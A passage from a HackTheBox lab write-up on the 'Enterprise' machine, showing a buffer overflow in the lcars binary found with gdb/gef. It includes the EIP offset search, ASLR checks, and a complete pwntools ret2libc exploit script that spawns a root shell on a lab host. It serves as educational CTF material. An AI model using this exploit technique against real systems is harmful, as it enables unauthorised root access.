strcmp that compares string you give with <strong>picarda1</strong>. So i tried this key and we got to the menu after that I tried to give every option of the menu 500 “A”‘s as input to check for buffer overflow and 4th option is vulnerable to buffer overflow.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_seg-fault.png" class="kg-image" alt loading="lazy" width="735" height="339"><figcaption>Buffer Overflow Detected</figcaption></figure><p>Now that I knew that there is a buffer Overflow in this program I created a pattern with pattern create and pattern offset. To find out exactly where we are overwriting EIP.</p><pre><code class="language-bash">gef➤  pattern create 500
+[+] Generating a pattern of 500 bytes
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
+[+] Saved as '$_gef1'
+gef➤  r
+Starting program: /root/Desktop/HackTheBox-Machines/Enterprise/lcars 
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    \_ ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+Enter Bridge Access Code: 
+picarda1
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    \_ ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+LCARS Bridge Secondary Controls -- Main Menu: 
+
+1. Navigation
+2. Ships Log
+3. Science
+4. Security
+5. StellaCartography
+6. Engineering
+7. Exit
+Waiting for input: 
+4
+Disable Security Force Fields
+Enter Security Override:
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63616164 in ?? ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x216     
+$ebx   : 0x63616162 ("baac"?)
+$ecx   : 0x7ffffde9
+$edx   : 0xf7fb5010  →  0x00000000
+$esp   : 0xffffd0b0  →  "eaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqa[...]"
+$ebp   : 0x63616163 ("caac"?)
+$esi   : 0xf7fb3000  →  0x001d6d6c ("lm"?)
+$edi   : 0xf7fb3000  →  0x001d6d6c ("lm"?)
+$eip   : 0x63616164 ("daac"?)
+$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd0b0│+0x0000: "eaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqa[...]"	 ← $esp
+0xffffd0b4│+0x0004: "faacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacra[...]"
+0xffffd0b8│+0x0008: "gaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsa[...]"
+0xffffd0bc│+0x000c: "haaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaacta[...]"
+0xffffd0c0│+0x0010: "iaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacua[...]"
+0xffffd0c4│+0x0014: "jaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacva[...]"
+0xffffd0c8│+0x0018: "kaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwa[...]"
+0xffffd0cc│+0x001c: "laacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxa[...]"
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x63616164
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "lcars", stopped, reason: SIGSEGV
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  pattern search 0x63616164
+[+] Searching '0x63616164'
+[+] Found at offset 212 (little-endian search) likely
+[+] Found at offset 308 (big-endian search) 
+</code></pre><p>We found the offset. Now we need to check if there are any protections on the binary itself like DEP or ASLR. So i did a checksec and it showed me no protection . I went to remote machine and tested if ASLR is Disabled.</p><pre><code class="language-bash">$ cat /proc/sys/kernel/randomize_va_space
+0
+$ ldd /bin/lcars | grep libc
+	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
+$ ldd /bin/lcars | grep libc
+	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)</code></pre><p>These two checks confirmed that ASLR or DEP is not enabled as no random libc address is shown and randomize_va_space is zero. Now ill write a python exploit to use buffer overflow and get root on the box.</p><pre><code class="language-bash">(gdb) r
+Starting program: /bin/lcars 
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    \_ ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+Enter Bridge Access Code: 
+^Z
+Program received signal SIGTSTP, Stopped (user).
+0xf7fd7c89 in __kernel_vsyscall ()
+no debug info&gt;} 0xf7e3faf0 &lt;exit&gt;
+# Getting system address
+(gdb) p system
+$7 = {&lt;text variable, no debug info&gt;} 0xf7e4c060 &lt;system&gt;
+# Getting Exit address
+(gdb) p exit
+$8 = {&lt;text variable, no debug info&gt;} 0xf7e3faf0 &lt;exit&gt;
+# Getting bin/sh address
+(gdb) find &amp;system,+9999999,"sh"
+0xf7f6ddd5
+0xf7f6e7e1
+0xf7f70a14
+0xf7f72582
+4 patterns found.
+# Verifying address of /bin/sh
+(gdb) x/s 0xf7f6ddd5
+0xf7f6ddd5:	"sh"</code></pre><p>Above is how i got all the memory  addresses from the gdb on target system.</p><h2 id="enterprise-writeup-python-exploit-root">Enterprise Writeup: Python Exploit &amp; Root</h2><pre><code class="language-python">from pwn import *
+
+context(os="linux", arch="i386")
+HOST, PORT = "10.10.10.61", 32812
+
+#EIP OverWrite @ 212
+
+junk = "\x90" * 212
+
+ret2libc = p32(0xf7e4c060) # System()
+ret2libc += p32(0xf7e3faf0) # Exit()
+ret2libc += p32(0xf7f6ddd5) # sh
+
+payload = junk + ret2libc
+r = remote(HOST,PORT)
+r.recvuntil("Enter Bridge Access Code:")
+r.sendline("picarda1")
+r.recvuntil("Waiting for input:")
+r.sendline("4")
+r.recuntil("Enter Security Override:")
+r.sendline(payload)
+r.interactive()</code></pre><p>And now the moment of truth we’ll run this exploit and hope everything is gone be fine and we will get root.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2020_04_root.png" class="kg-image" alt loading="lazy" width="726" height="286"><figcaption>Got root</figcaption></figure><p>Huh.. this was an Enterprise Writeup long one i hope you enjoyed this box as much as I did. I  would love to see your comments. If you have any questions. Feel free to respect my account on hackthebox. If you feel like it this is my account. <a href="//www.hackthebox.eu/home/users/profile/157669">https://www.hackthebox.eu/home/users/profile/157669</a>.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/hackthebox/" class="tag">HackTheBox</a>
+      <a href="/tag/writeup/" class="tag">Writeup</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
